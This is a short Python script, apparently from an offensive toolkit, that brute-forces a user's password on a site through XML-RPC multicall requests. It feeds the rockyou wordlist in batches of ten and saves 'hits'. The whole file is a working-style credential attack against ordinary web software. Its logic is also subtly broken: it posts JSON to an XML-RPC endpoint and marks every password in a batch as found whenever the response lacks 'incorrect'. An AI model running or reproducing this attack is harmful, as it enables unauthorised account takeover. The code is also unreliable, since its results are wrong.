import requests
from utils.xmlrpc_utils import build_multicall_payload
from utils.logger import save_hit

def xmlrpc_brute(target_url, username):
    session = requests.Session()
    wordlist_path = "wordlists/rockyou.txt"
    
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        while True:
            batch = [line.strip() for _, line in zip(range(10), f)]
            if not batch:
                break

            payload = build_multicall_payload(username, batch)
            try:
                resp = session.post(target_url, json=payload)
                if "faultCode" not in resp.text:
                    for pwd in batch:
                        if "incorrect" not in resp.text:
                            save_hit(username, pwd)
            except Exception as e:
                print(f"[!] Error: {e}")
